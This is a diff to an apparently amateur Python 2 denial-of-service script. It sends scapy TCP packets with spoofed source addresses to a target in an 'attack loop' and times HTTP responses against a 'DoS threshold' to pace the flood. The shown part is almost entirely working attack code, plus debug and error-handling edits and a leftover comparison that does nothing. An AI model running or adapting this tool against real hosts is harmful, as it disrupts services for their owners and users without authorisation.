@@ -8,7 +8,7 @@
 #By @arbitrary_code
 
 #yikes, clean this up!
-from scapy import all
+from scapy.all import *
 
 import argparse
 import random
@@ -35,6 +35,7 @@ def main():
 	parser.add_argument('-v', '--verbose', help='enable verbosity', action = 'store_true')
 	args = parser.parse_args()
 
+	print args
 
 	if args.ipdst is None: 
 		parser.print_help()
@@ -55,6 +56,9 @@ def main():
 	dstUrl = ''.join(args.url)
 
 
+	print dstPort
+
+
 
 
 
@@ -71,8 +75,6 @@ def main():
 		print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
 
 
-
-
 		#attack loop
 
 		#queue timer...is there a better way to measure latency with py requests?
@@ -80,8 +82,11 @@ def main():
 
 		#uses http://docs.python-requests.org/en/master/api/
 
-		response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
-
+		try:
+			response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
+		except requests.exceptions.RequestException as e:
+			print e
+			sys.exit(1)
 		#measure ET
 		elapsedTime = str(round((time.time()-startTime)*1000.0))
 
@@ -91,18 +96,20 @@ def main():
 
 
 		payload = 'foo'
+
+		#print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
 		#TCP packet scapy send
-		send(IP(src=srcIp, dst=dstIp) / TCP(sport=srcPort, dport=dstPort) / payload )
+		send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload )
 
 
-		if elapsedTime <= ''.join(args.threshold):
+		if float(elapsedTime) <= float(''.join(args.threshold)):
 			print 'under DoS threshold'
 		else:
-			elapsedTime > ''.join(args.threshold)
+			float(elapsedTime) > float(''.join(args.threshold))
 			print 'over DoS threshold'
 			print 'elapsed time is: %s' % elapsedTime
 			print ''.join(args.threshold)
-			delay = int(elapsedTime.split('.')[0]) - int(''.join(args.threshold))
+			delay = abs(float(elapsedTime.split('.')[0]) - float(''.join(args.threshold)))
 			print 'DoS threshold of %s met, reducing by %s' % (''.join(args.threshold), str(delay))
 			time.sleep(delay/1000)
 
